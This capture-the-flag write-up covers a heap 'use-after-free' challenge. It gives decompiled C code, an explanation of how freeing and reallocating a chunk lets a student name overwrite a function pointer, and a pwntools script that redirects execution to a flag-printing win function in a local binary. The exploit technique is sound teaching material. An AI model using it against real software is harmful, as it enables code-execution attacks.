# Pwn - Use And Forget
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

```sh
appcode > checksec uaf1
[*] './uaf1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

appcode > ./uaf1
1) create student1
2) create student2
3) print student1 name
4) print student2 name
5) free student1
6) free student2
>>
```

On running the program, it seems to be some sort of heap menu. We can investigate further by throwing it into IDA.

```c
int main()
{
  int opt;
  char opt_str[24];
  unsigned __int64 canary;

  canary = __readfsqword(0x28u); // ignore this, this is the stack canary
  setup(); // ignore this, just disables buffering

  while ( 1 )
  {
    do
    {
LABEL_2:
      menu();
      fgets(opt_str, 16, stdin);
      opt = atoi(opt_str);
    }
    while ( opt <= 0 || opt > 8 );
    switch ( opt )
    {
      case 1:
        if ( student1 )
          goto LABEL_9;
        student1 = malloc(0x18uLL);
        if ( !student1 )
          exit(-1);
        *(_QWORD *)student1 = print_student1_name;
        puts("Enter student1 name:");
        read(0, (char *)student1 + 8, 0x10uLL);
        goto LABEL_2;
      case 2:
LABEL_9:
        if ( student2 )
          goto LABEL_13;
        student2 = malloc(0x18uLL);
        if ( !student2 )
          exit(-1);
        *((_QWORD *)student2 + 2) = print_student2_name;
        puts("Enter student2 name:");
        read(0, student2, 0x10uLL);
        break;
      case 3:
LABEL_13:
        if ( student1 )
          (*(void (**)(void))student1)();
        break;
      case 4:
        if ( student2 )
          (*((void (**)(void))student2 + 2))();
        break;
      case 5:
        if ( student1 )
        {
          free(student1);
          puts("student1 freed");
        }
        break;
      case 6:
        if ( student2 )
        {
          free(student2);
          puts("student1 freed");
        }
        break;
      default:
        goto LABEL_2;
    }
  }
}
```

This program is simple. There are two student buffers that we can allocate on a heap. Both student buffer have slightly varying struct that contains the name, and the student pointer. We can also choose to free this student buffer.

As implied by the challenge name, there is use-after-free vulnerability since the student variables are not set to 0 after freeing. This allows us to continue to do stuff to the students even after the buffer has been freed. How can we use this to solve the challenge?

First, we can identify the two student structs to be as such

```c
struct student1 {
    void (* print_student1_name)();
    char name[0x10];
};

struct student2 {
    char name[0x10];
    void (* print_student2_name)();
};
```

As we can see, the structs slightly vary in the order of the variables that it contains. This is how the exploit goes:

1. Create Student 1 _(this allocates a heap buffer of size 0x18)_
2. Free Student 1 _(the heap buffer of size 0x18 is freed)_
3. Create Student 2 _(this **reallocates** the same heap buffer of size 0x18 from what was freed earlier)_

At this point, the memory address that is assigned to **student1** and **student2** is identical. This is because the dynamic memory allocator tend to optimize the allocation of heap memory by reusing memory that has been freed. Thus student 2 heap buffer is reallocated from the freed student 1 heap buffer.

This means that the student 2 name will overwrite the student 1 function pointer, allowing us to get **RIP control** by overwriting student 1 name, and then trying to print student 1 name which would call the function pointer that has been overwritten by us.

Conveniently, there is no PIE and there is a win function that we can call and will gives us the flag.

```c
void __noreturn secret()
{
  FILE *stream; // [rsp+8h] [rbp-98h]
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+98h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Congratulations.. here is your flag..");
  stream = fopen("flag.txt", "rb");
  fgets(s, 128, stream);
  puts(s);
  fclose(stream);
  exit(0);
}
```

Here's the solve script

```py
from pwn import *

context.binary = elf  = ELF("./uaf1")
p = process("./uaf1")

p.sendlineafter(b">> ", b"1") # allocate student 1
p.sendlineafter(b"name:\n", b"student 1's name")
p.sendlineafter(b">> ", b"5") # free student 1
p.sendlineafter(b">> ", b"2") # allocate student 2 !! OVERLAPPING CHUNKS
p.sendlineafter(b"name:\n", p64(elf.sym.secret)) # overwrite student 1 function pointer
p.sendlineafter(b">> ", b"3") # print student 1 name, which will call secret

p.interactive()
```
